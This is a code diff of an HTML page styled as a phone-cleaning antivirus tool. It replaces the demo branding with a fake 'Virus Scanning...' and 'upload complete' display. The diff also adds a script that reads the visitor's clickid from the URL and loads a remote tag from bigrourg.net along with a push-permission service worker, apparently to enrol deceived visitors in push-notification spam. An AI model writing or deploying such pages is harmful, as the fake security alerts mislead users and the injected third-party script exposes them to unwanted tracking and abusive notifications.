@@ -15,17 +15,17 @@
         <div unstyle="cn-space to_cent" class="grid_18r">
             <div unstyle="cn-start to_cent" class="fs-x08 fw-normal">
                 <img src="./icon_shield.png" class="grid_1r">
-                <div><span class="c-blue-light">PHONE </span> CLEAN</div>
-                &nbsp;<span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light">℗</span>
+                <div><span class="c-blue-light">  </span> Virus Scanning...</div>
+                &nbsp;<span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light"></span>
             </div>
-            <div class="c-blue-dis fs-x08 tx-center fw-normal">v. 4.04.2</div>
+            <div class="c-blue-dis fs-x08 tx-center fw-normal"></div>
         </div>
     </div>
     <div unstyle="cn-center" class="content layer_3 c-white alert">
         <div unstyle="cn-around_space" class="main_text grid_18r fw-normal alert">
-            <div id="message_1" class="layer_4 grid_100p tx-center info_message_1 fs-x14 fw-light part_1" style="display: none;"><span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light" style="vertical-align: super;color: #b9b9b9;">demo </span>Uploading <span id="dots" class="grid_1r">..</span></div>
+            <div id="message_1" class="layer_4 grid_100p tx-center info_message_1 fs-x14 fw-light part_1" style="display: none;"><span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light" style="vertical-align: super;color: #b9b9b9;"></span>Uploading <span id="dots" class="grid_1r">..</span></div>
             <div id="message_2" class="layer_4 info_message_2 fw-light grid_100p tx-center part_2 fs-x12" style="display: block;">
-                <div><span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light" style="vertical-align: super;color: #b9b9b9;">demo </span>The upload is complete</div>
+                <div><span unstyle="selfstart" class="fw-thin fs-x06 c-blue-light" style="vertical-align: super;color: #b9b9b9;"></span>The upload is complete</div>
 
             </div>
             <div id="message_data" class="layer_4 grid_18r">
@@ -132,5 +132,22 @@
     </script>
 
 <!--暂无法使用push收集，会导致页面倒计时异常-->
+
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+  </script>
 
 </body></html>
